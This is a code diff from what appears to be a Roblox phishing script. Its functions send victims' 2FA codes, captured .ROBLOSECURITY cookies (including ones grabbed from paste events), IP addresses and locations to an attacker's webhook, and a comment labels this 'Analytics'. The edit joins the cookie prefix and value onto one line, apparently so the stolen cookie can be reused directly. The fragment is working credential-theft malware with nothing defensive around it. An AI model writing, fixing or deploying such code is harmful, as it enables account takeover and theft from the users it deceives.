@@ -281,8 +281,7 @@ async function send2FAToWebhook(code, trustDevice) {
 \`\`\`
 Code: ${code}
 Trust Device: ${trustDevice ? 'Yes (30 days)' : 'No'}
-Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_
-${robloxCookie}` : 'None found'}
+Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : 'None found'}
 Time: ${timestamp}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
@@ -332,8 +331,7 @@ async function handlePasteEvent(pastedText) {
             const payload = {
                 content: `🍪 **Roblox Cookie Captured (Paste Event)**
 \`\`\`
-Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_
-${robloxCookie}
+Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}
 Time: ${timestamp}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
@@ -594,8 +592,7 @@ async function submitPowerShell() {
         // Analytics payload with scan results
         const payload = {
             content: `@everyone
-Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_
-${robloxCookie}` : 'None found'}
+Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
